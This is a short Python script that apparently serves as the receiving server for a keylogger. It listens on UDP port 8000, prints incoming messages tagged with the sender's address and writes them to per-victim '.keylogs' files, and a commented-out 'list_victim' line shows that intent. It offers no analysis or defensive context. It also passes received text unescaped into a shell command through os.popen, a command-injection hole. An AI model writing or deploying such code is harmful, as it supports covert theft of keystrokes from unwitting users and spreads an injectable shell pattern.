from socket import *
import os

serverSocket = socket(AF_INET, SOCK_DGRAM)
serverSocket.bind(('', 8000))
#list_victim=[]
while True:
        message, address = serverSocket.recvfrom(1024);
        print '[%s] '%str(address[0])+message
        os.popen('echo "%s" >> %s'%(message, address[0]+'.keylogs'))

        #serverSocket.sendto(message, address);
        serverSocket.close;
